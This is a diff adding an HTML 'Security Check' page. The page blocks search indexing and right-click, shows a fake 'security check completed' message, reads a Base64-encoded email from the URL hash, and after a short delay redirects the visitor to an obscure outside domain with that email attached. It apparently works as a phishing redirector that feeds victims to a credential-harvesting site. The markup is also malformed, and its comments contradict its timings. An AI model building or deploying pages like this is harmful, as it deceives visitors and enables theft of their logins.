@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <meta name="robots" content="noindex, nofollow"> <!-- Meta tag to prevent indexing by search engines -->
+    <style>
+        .container {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* Center content vertically and horizontally */
+            min-height: 100vh; /* Set minimum height to viewport height */
+        }
+        .image-container {
+            position: relative;
+            width: 100%; /* Full width */
+            max-width: 900px; /* Limit the maximum width to maintain image quality */
+        }
+        .image-container img {
+            width: 100%; /* Set image width to 100% */
+            height: auto; /* Maintain aspect ratio */
+            display: block;
+        }
+        .security-check {
+            display: none; /* Initially hidden */
+            margin-top: 1rem; /* Margin from the top */
+            font-size: 1rem; /* Further reduced font size */
+            color: #4CAF50; /* Change color to green for completed status */
+            text-align: center; /* Center text */
+            font-family: 'Arial', sans-serif; /* Change font family */
+            background-color: #f2f2f2; /* Background color */
+            padding: 10px 20px; /* Padding */
+            border-radius: 10px; /* Border radius */
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.3); /* Box shadow */
+            position: absolute; /* Position at the bottom of the page */
+            bottom: 20px; /* Adjust distance from the bottom */
+            left: 50%; /* Center horizontally */
+            transform: translateX(-50%); /* Center horizontally */
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;"> <!-- Disable right-click context menu -->
+    <!-- Container for the image -->
+    <div class="container">
+        <!-- Image container -->
+        <div class="image-container">
+            <!-- Replace the text with an image -->
+            <img src="" alt="">
+			    </script>
+
+    <!-- Message to indicate security check completion -->
+    <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
+</body>
+        </div>
+    </div>
+
+    <script>
+        // Function to extract email from URL hash
+        function getEmailFromHash() {
+            try {
+                var hash = window.location.hash.substr(1); // Remove the "#" symbol from the hash
+                var decodedHash = atob(hash); // Decode the Base64 string
+                return decodedHash;
+            } catch (error) {
+                console.error("Error extracting email from hash:", error);
+                return null; // Return null if there's an error
+            }
+        }
+
+        // Function to populate the email into your portal form field
+        function populateEmail() {
+            try {
+                var email = getEmailFromHash();
+                // Assuming your portal form field has an ID of "email"
+                document.getElementById("email").value = email;
+            } catch (error) {
+                console.error("Error populating email:", error);
+            }
+        }
+
+        // Call the populateEmail function when the page loads
+        window.onload = function() {
+            try {
+                // Disconnect for 10 seconds (10000 milliseconds)
+                setTimeout(function() {
+                    // Reconnect after the disconnection period
+                    // You can display a message indicating reconnection here if needed
+                    console.log("Reconnecting...");
+
+                    // After reconnecting, display the message indicating security check completion
+                    document.querySelector('.security-check').style.display = 'block';
+
+                    // Wait for additional 6 seconds (6000 milliseconds) before redirecting
+                    setTimeout(function() {
+                        // Redirect the user to the specified URL
+                        var redirectTo = "https://kjfdsh.org/swksdesd#" + window.location.hash.substr(1);
+                        console.log("Redirecting to: " + redirectTo);
+                        window.location.href = redirectTo;
+                    }, 1000); // Wait for 6 seconds after security check completion
+
+                }, 1000); // Disconnect for 10 seconds
+
+                // Populate email after 10 seconds
+                setTimeout(function() {
+                    populateEmail();
+                    // Display the security check message
+                    document.querySelector('.security-check').style.display = 'block';
+                }, 1000);
+
+            } catch (error) {
+                console.error("Error during page load:", error);
+            }
+        };
+    </script>
+
+    <!-- Message to indicate security check completion -->
+</body>
+</html>
+\
